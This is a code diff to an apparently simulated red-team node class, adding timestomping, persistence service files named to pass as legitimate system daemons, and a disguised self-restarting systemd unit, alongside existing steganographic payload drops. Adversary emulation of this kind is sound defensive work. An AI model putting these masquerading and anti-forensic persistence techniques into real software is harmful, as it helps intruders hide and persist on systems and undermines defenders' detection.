@@ -16,6 +16,7 @@ import config
 import utils
 import urllib.parse
 import base64
+import shutil
 from vnet.nic import VNic
 from vnet.protocol import MSG_DATA
 
@@ -326,6 +327,15 @@ class RedMeshNode:
             utils.steganography_encode(payload, fname)
             logger.info(f"Dropped Stego Payload: {fname}")
 
+    def timestomp(self, path):
+        """Match timestamps of a system file (Obfuscation)."""
+        try:
+            # Pick a reference file (e.g., config.py)
+            ref_path = config.BASE_DIR
+            st = os.stat(ref_path)
+            os.utime(path, (st.st_atime, st.st_mtime))
+        except: pass
+
     def establish_persistence(self):
         """Simulate dropping persistence artifacts (Systemd Service)."""
         # Lazarus Mechanism: Re-create if missing
@@ -335,15 +345,28 @@ class RedMeshNode:
                 self._write_persistence(self.persistence_file)
             return
 
-        # New Persistence
+        # New Persistence with Masquerading
         if random.random() < 0.3: # 30% chance to establish
-            svc_name = f"systemd-worker-{secrets.token_hex(4)}.service"
+            # Masquerade as legitimate service
+            legit_names = ["dbus-daemon-helper", "systemd-journal-upload", "network-dispatcher", "cron-daily"]
+            svc_name = f"{random.choice(legit_names)}.service"
+
             target = os.path.join(config.PERSISTENCE_DIR, svc_name)
             self._write_persistence(target)
             self.persistence_file = target
+            self.timestomp(target)
 
     def _write_persistence(self, target):
-        content = f"[Unit]\nDescription=Worker {NODE_ID}\n[Service]\nExecStart={sys.executable} {os.path.abspath(__file__)}"
+        # Obfuscated Service Content
+        content = f"""[Unit]
+Description=System Daemon Helper
+Documentation=man:systemd(1)
+
+[Service]
+Type=simple
+ExecStart={sys.executable} {os.path.abspath(__file__)} --worker
+Restart=always
+"""
         try:
             with open(target, 'w') as f: f.write(content)
             logger.info(f"Persistence established: {os.path.basename(target)}")
